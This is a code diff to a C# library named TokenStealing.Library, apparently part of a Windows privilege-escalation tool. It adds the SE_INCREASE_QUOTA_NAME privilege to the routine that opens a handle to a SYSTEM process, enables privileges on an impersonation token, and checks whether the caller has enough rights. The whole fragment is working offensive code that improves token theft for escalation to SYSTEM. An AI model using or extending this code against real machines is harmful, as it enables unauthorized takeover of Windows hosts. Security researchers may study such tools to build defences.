@@ -166,7 +166,8 @@ namespace TokenStealing.Library
             var requiredPrivs = new List<string>
             {
                 Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME,
-                Win32Consts.SE_IMPERSONATE_NAME
+                Win32Consts.SE_IMPERSONATE_NAME,
+                Win32Consts.SE_INCREASE_QUOTA_NAME
             };
             var isImpersonated = false;
             var status = false;
@@ -193,10 +194,10 @@ namespace TokenStealing.Library
                         Console.WriteLine("[+] {0} is enabled successfully.", priv.Key);
                 }
 
-                if (!adjustedPrivs[Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME] &&
+                if (!(adjustedPrivs[Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME] && adjustedPrivs[Win32Consts.SE_INCREASE_QUOTA_NAME]) &&
                     !adjustedPrivs[Win32Consts.SE_IMPERSONATE_NAME])
                 {
-                    Console.WriteLine("[-] {0} and {1} are not available.", Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME, Win32Consts.SE_IMPERSONATE_NAME);
+                    Console.WriteLine("[-] You don't have sufficient privileges.");
                     break;
                 }
 
@@ -204,7 +205,7 @@ namespace TokenStealing.Library
                 Console.WriteLine("[>] Trying to get handle from a SYSTEM process.");
 
                 hProcess = Utilities.GetSystemProcessHandle(
-                    new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME },
+                    new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME, Win32Consts.SE_INCREASE_QUOTA_NAME },
                     out int pid,
                     out string processName);
 
@@ -265,7 +266,7 @@ namespace TokenStealing.Library
 
                     status = Utilities.EnableTokenPrivileges(
                         hImpersonationToken,
-                        new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME },
+                        new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME, Win32Consts.SE_INCREASE_QUOTA_NAME },
                         out Dictionary<string, bool> _);
 
                     if (!status)
